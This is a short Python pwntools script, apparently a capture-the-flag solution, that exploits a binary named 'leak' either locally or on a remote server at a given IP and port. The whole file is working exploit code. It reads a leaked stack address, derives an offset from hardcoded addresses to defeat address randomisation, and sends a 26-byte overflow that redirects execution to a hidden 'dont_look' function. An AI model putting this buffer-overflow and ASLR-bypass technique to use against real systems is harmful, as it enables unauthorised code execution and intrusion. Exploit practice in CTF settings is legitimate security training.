#!/usr/bin/env python3

from pwn import *
from pprint import pprint

context.log_level = 'error'

elf = ELF("./handout/leak")

REMOTE = len(sys.argv) > 1 and "remote" in sys.argv[1].lower()
if REMOTE: p = remote("20.100.164.71", 1024); print("REMOTE")
else:      p = process(elf.path, aslr=True); print("LOCAL")

p.recvuntil(b"number\n").decode()
p.sendline(b"23")
p.recvuntil(b"5:")
sp = int(p.recvline().decode().strip(),16)
p.recvuntil(b"(1-5)\n")

overflowOffset = 26
baseAddress = 0x5634f0a31000 
leakedAddress = 0x5634f0a34d78
memoryAddressOffset = leakedAddress - baseAddress

payload = [
    b"A"*overflowOffset,
    p64(sp-memoryAddressOffset+elf.symbols['dont_look']),
]

p.sendline(b"".join(payload))
print(p.recvall().decode())